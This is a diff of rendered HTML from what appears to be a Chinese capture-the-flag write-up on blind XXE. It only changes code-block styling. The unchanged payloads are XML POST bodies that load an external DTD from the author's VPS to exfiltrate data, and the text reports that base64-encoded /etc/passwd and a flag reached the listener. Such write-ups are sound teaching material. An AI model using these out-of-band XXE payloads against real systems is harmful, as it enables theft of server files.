@@ -110,13 +110,13 @@
 &lt;ul&gt;
 &lt;li&gt;然后构造&lt;code&gt;post&lt;/code&gt;请求包，并发送&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;!DOCTYPE root [
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;!ENTITY % remote SYSTEM &amp;#34;http://本人vps的ip:7890&amp;#34;/xxe.dtd&amp;#34;&amp;gt;%remote;]&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;comment&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;text&amp;gt;test&amp;amp;send;&amp;lt;/text&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/comment&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015330.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE root [
+&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://本人vps的ip:7890&amp;quot;/xxe.dtd&amp;quot;&amp;gt;%remote;]&amp;gt;
+&amp;lt;comment&amp;gt;
+&amp;lt;text&amp;gt;test&amp;amp;send;&amp;lt;/text&amp;gt;
+&amp;lt;/comment&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015330.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;然后发现服务器端的监听有了反应，出来了&lt;code&gt;/etc/passwd&lt;/code&gt;经过&lt;code&gt;base64&lt;/code&gt;加密后字符&lt;/li&gt;
 &lt;/ul&gt;
@@ -162,10 +162,10 @@
 &lt;ul&gt;
 &lt;li&gt;然后构造&lt;code&gt;post&lt;/code&gt;请求包，并发送&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;!DOCTYPE xxe SYSTEM &amp;#34;http://本人vps的ip:7890/mmm.dtd&amp;#34;&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;send&amp;gt;&amp;lt;username&amp;gt;&amp;amp;xxe;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/send&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022028.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE xxe SYSTEM &amp;quot;http://本人vps的ip:7890/mmm.dtd&amp;quot;&amp;gt;
+&amp;lt;send&amp;gt;&amp;lt;username&amp;gt;&amp;amp;xxe;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/send&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022028.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;我们发现服务器监听端口有了反应，返回了一串&lt;code&gt;base64&lt;/code&gt;加密后字符串，解密后是&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
@@ -216,10 +216,10 @@
 &lt;ul&gt;
 &lt;li&gt;然后构造&lt;code&gt;post&lt;/code&gt;请求包，并发送&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;!DOCTYPE xxe SYSTEM &amp;#34;http://本人vps的ip:7890/mmm.dtd&amp;#34;&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;send&amp;gt;&amp;lt;username&amp;gt;&amp;amp;xxe;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/send&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005212.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE xxe SYSTEM &amp;quot;http://本人vps的ip:7890/mmm.dtd&amp;quot;&amp;gt;
+&amp;lt;send&amp;gt;&amp;lt;username&amp;gt;&amp;amp;xxe;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/send&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005212.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;我们发现服务器监听端口有了反应，返回了一串&lt;code&gt;base64&lt;/code&gt;加密数据&lt;/li&gt;
 &lt;/ul&gt;
